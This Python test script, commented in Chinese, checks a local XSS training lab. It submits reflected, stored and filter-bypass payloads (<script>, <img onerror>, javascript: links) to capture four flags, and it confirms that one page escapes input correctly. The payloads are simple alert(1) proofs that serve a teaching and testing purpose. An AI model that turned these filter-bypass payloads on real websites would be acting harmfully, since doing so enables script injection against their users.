# -*- coding: utf-8 -*-
"""验证 Verse XSS 靶场 4 个 FLAG 可解 + 安全页无漏洞"""
import requests
import time

BASE = "http://127.0.0.1:5028"


def check_flags():
    r = requests.get(BASE + "/")
    return {
        "flag1": "FLAG1 反射型 ✅" in r.text,
        "flag2": "FLAG2 存储型·绕script ✅" in r.text,
        "flag3": "FLAG3 存储型·绕事件 ✅" in r.text,
        "flag4": "FLAG4 DOM型 ✅" in r.text,
    }


# 重置
requests.get(BASE + "/reset")
time.sleep(0.3)
print("=== 重置完成 ===")
print("重置后:", check_flags())
print()

# FLAG1 反射型：搜索框直接 <script>
print("=== FLAG1 反射型 ===")
r = requests.get(BASE + "/search", params={"q": "<script>alert(1)</script>"})
print("search 返回含 FLAG1:", "FLAG1{" in r.text)
print()

# FLAG2 存储型：留言板过滤 script，用 <img onerror> 绕过
print("=== FLAG2 存储型·绕script ===")
requests.post(BASE + "/board", data={"content": "<img src=x onerror=alert(1)>"})
r = requests.get(BASE + "/board")
print("board 返回含 img onerror:", "<img" in r.text.lower() and "onerror" in r.text.lower())
print("FLAG2 已记录:", "FLAG2{" in r.text)
print()

# FLAG3 存储型：简介过滤 script+事件，用 javascript: 伪协议绕过
print("=== FLAG3 存储型·绕事件 ===")
requests.post(BASE + "/profile", data={"bio": '<a href="javascript:alert(1)">click</a>'})
r = requests.get(BASE + "/profile")
print("profile 返回含 javascript:", "javascript:" in r.text.lower())
print("FLAG3 已记录:", "FLAG3{" in r.text)
print()

# FLAG4 DOM型：前端 JS 检测注入回调（requests 不执行 JS，模拟回调验证服务器逻辑）
print("=== FLAG4 DOM型 ===")
r = requests.get(BASE + "/dom-flag-callback")
print("callback 返回:", r.text[:60])
print()

# 安全页：正确转义，无法注入
print("=== 安全页 /about ===")
r = requests.get(BASE + "/about", params={"note": "<script>alert(1)</script>"})
print("about 转义了 script:", "<script>" not in r.text and "&lt;script&gt;" in r.text)
print()

print("=== 最终 FLAG 状态 ===")
print(check_flags())
